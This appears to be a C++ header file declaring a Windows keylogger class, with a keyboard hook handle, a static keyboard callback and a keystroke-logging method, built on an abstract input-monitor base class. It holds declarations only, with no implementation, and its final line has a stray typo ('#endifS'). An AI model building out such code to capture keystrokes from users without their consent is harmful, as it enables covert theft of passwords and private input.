#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <iostream>
#include <fstream>
#include <Windows.h>
#include <string>

#pragma comment(lib, "user32.lib")

using namespace std;

// ---------------- BASE CLASS ----------------
class InputMonitor {
public:
    virtual bool start() = 0;
    virtual void run() = 0;
    virtual void stop() = 0;
    virtual ~InputMonitor() {}
};

// ---------------- DERIVED CLASS ----------------
class KeyLogger : public InputMonitor {
private:
    HHOOK keyboardHook;

    void logKeystroke(int key);

    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    static KeyLogger* instance;  //stores keylogger obj memory address

public:
    KeyLogger();

    bool start() override;
    void run() override;
    void stop() override;
};

#endifS